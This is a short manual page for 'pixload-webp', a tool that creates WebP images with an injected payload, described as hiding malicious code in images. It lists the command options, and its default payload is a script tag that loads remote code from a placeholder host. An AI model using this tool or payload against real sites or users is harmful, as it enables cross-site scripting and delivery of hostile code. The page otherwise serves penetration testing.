=head1 NAME

pixload-webp - hide payload/malicious code in WebP images

=head1 SYNOPSIS

B<pixload-webp> [I<OPTION>]... I<FILE>

=head1 DESCRIPTION

B<pixload-webp> creates a WebP Image with payload, or injects payload
into existing image.

Currently, there is no possibility to inject the payload into an existing
WebP image. Only the new (minimal) WebP image will be created and your
payload will be injected into.

=head1 OPTIONS

Mandatory arguments to long options are mandatory for short options too.

=over 8

=item B<-P>, B<--payload> I<STRING>

Set payload for injection.
Default is C<< <script src=//example.com></script> >>.

=item B<-v>, B<--version>

Print version and exit.

=item B<-h>, B<--help>

Print help and exit.

=back

If the output FILE already exists, the payload will be injected into existing
image, but this image will be corrupted. Otherwise, the new one will be
created.
